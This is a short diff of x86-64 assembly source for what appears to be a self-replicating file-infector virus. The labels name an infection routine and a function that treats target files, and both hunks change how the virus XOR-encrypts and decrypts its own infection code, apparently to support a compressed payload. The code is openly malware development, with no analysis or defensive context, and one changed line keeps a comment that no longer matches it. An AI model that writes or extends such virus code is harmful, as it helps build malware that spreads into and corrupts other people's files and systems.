@@ -100,7 +100,7 @@ can_run_infection:
 .TMP_uncipher:
 	lea rdi, [rel begin]				; data = begin addr
 	add rdi, infection_routine - begin		; data += infection_routine - begin
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, [rel compressed_data_size2]		; size = compressed_data_size2
 	lea rdx, [rel key]				; key = key
 	mov rcx, key_size				; key_size = key_size
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
@@ -817,7 +817,7 @@ treat_file:
 	mov rdi, [mappedfile]				; data = file_map + filesize + (infection_routine - begin);
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
-	mov rsi, _end - infection_routine		; size = _end - infection_routine
+	mov rsi, [compressed_data_size]			; size = _end - infection_routine
 	lea rdx, [rel key]				; key = key
 	mov rcx, key_size				; key_size = key_size
 	call xor_cipher					; xor_cipher(data, size, key, key_size)
